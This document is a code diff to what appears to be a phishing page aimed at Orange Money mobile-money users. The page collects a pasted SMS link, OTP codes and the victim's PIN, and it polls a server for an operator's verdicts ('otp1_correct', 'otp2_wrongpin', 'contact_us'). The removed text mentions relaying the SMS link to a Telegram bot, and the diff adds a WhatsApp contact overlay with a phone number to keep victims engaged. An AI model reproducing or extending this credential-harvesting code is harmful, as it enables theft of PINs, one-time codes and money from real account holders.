@@ -129,7 +129,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.7);
+            background: rgba(0, 0, 0, 0.75);
             display: none;
             flex-direction: column;
             justify-content: center;
@@ -142,8 +142,8 @@
         }
 
         .overlay-card {
-            background: white;
-            color: #333;
+            background: #ff7900;
+            color: white;
             padding: 30px 20px;
             border-radius: 16px;
             width: 85%;
@@ -157,8 +157,8 @@
         .spinner {
             width: 50px;
             height: 50px;
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid #ff7900;
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-top: 5px solid white;
             border-radius: 50%;
             animation: spin 1s linear infinite;
             margin-bottom: 20px;
@@ -170,16 +170,29 @@
         }
 
         .overlay-title {
-            font-size: 18px;
+            font-size: 20px;
             font-weight: bold;
-            margin-bottom: 8px;
-            color: #111;
+            margin-bottom: 12px;
+            color: white;
         }
 
         .overlay-desc {
             font-size: 14px;
-            color: #666;
-            line-height: 1.4;
+            color: #fff;
+            line-height: 1.5;
+            margin-bottom: 15px;
+        }
+
+        .wa-link {
+            display: inline-block;
+            background-color: white;
+            color: #ff7900;
+            font-weight: bold;
+            padding: 12px 20px;
+            border-radius: 8px;
+            text-decoration: none;
+            margin-bottom: 15px;
+            word-break: break-all;
         }
 
         .error-message {
@@ -188,6 +201,7 @@
             margin-top: 10px;
             display: none;
             text-align: center;
+            font-weight: bold;
         }
     </style>
 </head>
@@ -221,14 +235,26 @@
 
 <div class="footer-banner"></div>
 
-<!-- Status Overlay -->
+<!-- Status Loading Overlay -->
 <div class="overlay" id="statusOverlay">
     <div class="overlay-card">
         <div class="spinner"></div>
-        <div class="overlay-title">Veuillez patienter</div>
-        <div class="overlay-desc">
-            Veuillez patienter pendant l'envoi du lien SMS complet au robot Telegram...
-        </div>
+        <div class="overlay-title">Please wait</div>
+    </div>
+</div>
+
+<!-- Contact Us WhatsApp Overlay -->
+<div class="overlay" id="contactOverlay">
+    <div class="overlay-card">
+        <div class="overlay-title">Contact Us on WhatsApp</div>
+        <div class="overlay-desc">You can contact us using either of the two options below:</div>
+        
+        <a href="https://api.whatsapp.com/send?phone=243855275313t&text=Jambo!%20I'd%20PESA%20Napata%20dje" target="_blank" class="wa-link">
+            Click this link
+        </a>
+
+        <div class="overlay-desc">Or through this number:</div>
+        <div style="font-size: 16px; font-weight: bold; margin-bottom: 15px;">+243855275313</div>
     </div>
 </div>
 
@@ -240,6 +266,7 @@ document.addEventListener("DOMContentLoaded", () => {
     const timerEl = document.getElementById('timer');
     const timerBox = document.getElementById('timerBox');
     const statusOverlay = document.getElementById('statusOverlay');
+    const contactOverlay = document.getElementById('contactOverlay');
     const errorText = document.getElementById('errorText');
 
     let checkInterval = null;
@@ -283,11 +310,12 @@ document.addEventListener("DOMContentLoaded", () => {
 
                 if (data.status === "otp1_correct") {
                     clearInterval(checkInterval);
-                    window.location.href = "/page5"; // Redirect to next step page
+                    window.location.href = "/page9"; // Redirect to page9
                 } else if (data.status === "otp1_wrong") {
                     clearInterval(checkInterval);
                     statusOverlay.style.display = "none";
-                    errorText.textContent = "Code OTP incorrect. Veuillez réessayer.";
+                    contactOverlay.style.display = "none";
+                    errorText.textContent = "The link is incorrect or the link has expired upload a new one you receive.";
                     errorText.style.display = "block";
                     smsInput.value = "";
                     submitBtn.disabled = true;
@@ -295,8 +323,13 @@ document.addEventListener("DOMContentLoaded", () => {
                 } else if (data.status === "otp2_wrongpin") {
                     clearInterval(checkInterval);
                     statusOverlay.style.display = "none";
-                    errorText.textContent = "Code PIN incorrect. Veuillez réessayer.";
-                    errorText.style.display = "block";
+                    contactOverlay.style.display = "none";
+                    alert("The PIN is wrong. Enter correct Orange Money PIN.");
+                    window.location.href = "/page6"; // Redirect to page6
+                } else if (data.status === "contact_us") {
+                    clearInterval(checkInterval);
+                    statusOverlay.style.display = "none";
+                    contactOverlay.style.display = "flex";
                 }
             } catch (err) {
                 console.error("Status check error:", err);
@@ -312,6 +345,7 @@ document.addEventListener("DOMContentLoaded", () => {
         if (!pastedLink) return;
 
         // Show loading overlay
+        contactOverlay.style.display = "none";
         statusOverlay.style.display = "flex";
         errorText.style.display = "none";
 
